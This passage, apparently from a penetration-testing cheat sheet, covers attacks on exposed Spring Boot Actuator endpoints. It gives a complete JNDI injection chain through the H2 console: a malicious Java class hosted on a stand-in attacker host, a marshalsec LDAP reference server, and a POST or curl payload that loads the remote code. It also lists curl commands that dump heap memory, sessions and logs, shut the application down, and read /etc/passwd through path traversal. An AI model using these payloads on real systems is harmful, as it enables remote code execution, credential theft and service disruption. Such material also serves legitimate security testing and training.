Access the h2 console `/h2-console`. An application will refirect to `/h2-console/login.jsp?jsessionid=xxxxxx`. Catch `jsessionid` value.

Prepare a Java code for execution, you can reuse the [JNDIObject.java](https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java). Compile in such a way that it is compatible with earlier JDK versions:

```bash
javac -source 1.5 -target 1.5 JNDIObject.java
```

Host compiled `JNDIObject.class` at `http://attacker-website.com/` and Set up a LDAP service with [marshalsec](https://github.com/mbechler/marshalsec):

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://attacker-website.com:80/#JNDIObject 1389
```

Trigger JNDI injection:

```bash
POST /h2-console/login.do?jsessionid=xxxxxx
Host: vulnerable-website.com
Content-Type: application/json
Referer: http://vulnerable-website.com/h2-console/login.jsp?jsessionid=xxxxxx

{
    "language": "en",
    "setting": "Generic+H2+(Embedded)",
    "name": "Generic+H2+(Embedded)",
    "driver": "javax.naming.InitialContext",
    "url": "ldap://attacker-website.com:1389/JNDIObject",
    "user": "",
    "password": ""
}

#Or curl
curl -X POST -H 'Content-Type: application/json' -d '{"language": "en","setting": "Generic+H2+(Embedded)","name": "Generic+H2+(Embedded)","driver": "javax.naming.InitialContext","url": "ldap://attacker-website.com:1389/JNDIObject","user": "","password": ""}' http://<TARGET>/h2-console/login.do?jsessionid=xxxxxx
```

</details>

### mappings

[mappings](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#mappings) displays a collated list of all `@RequestMapping` paths.

```bash
curl http://<TARGET>/actuator/mappings -i -X GET
```

### sessions

[sessions](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#sessions) allows retrieval and deletion of user sessions from a Spring Session-backed session store. Requires a Servlet-based web application using Spring Session.

```bash
curl http://<TARGET>/actuator/sessions?username=alice -i -X GET
```

### shutdown

[shutdown](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#shutdown) lets an application be gracefully shutdown. Disabled by default.

```bash
$ curl http://<TARGET>/actuator/shutdown -i -X POST
```

### heapdump

[heapdump](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#heapdump) returns a hprof heap dump file that may contain sensitive data, such as `env` properties. To retrieve data from a prof heap dump use [Eclipse Memory Analyzer](https://www.eclipse.org/mat/downloads.php) tool, check [Find password plaintext in spring heapdump using MAT](https://landgrey.me/blog/16/).

```bash
curl http://<TARGET>/actuator/heapdump -O
```

### logfile

[logfile](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#log-file) returns the contents of the logfile (if `logging.file.name` or `logging.file.path` properties have been set). Supports the use of the HTTP Range header to retrieve part of the log file's content.

```bash
curl http://<TARGET>/actuator/logfile -i -X GET
```

### logview

[spring-boot-actuator-logview](https://github.com/lukashinsch/spring-boot-actuator-logview) version before `0.2.13` is vulnerable to path traversal that allows you to retreive arbitrary files.

```bash
# retreaving /etc/passwd
curl http://<TARGET>/manage/log/view?filename=/etc/passwd&base=../../../../../
```

### dump or threaddump

[dump or threaddump](https://docs.spring.io/spring-boot/docs/2.4.0/actuator-api/htmlsingle/#threaddump) performs a thread dump from the application's JVM.

```bash
curl http://<TARGET>/actuator/threaddump -i -X GET -H 'Accept: application/json'
curl http://<TARGET>/actuator/dump -i -X GET -H 'Accept: application/json'
```

## Resources

{% embed url="https://github.com/mpgn/Spring-Boot-Actuator-Exploit" %}

{% embed url="https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators" %}
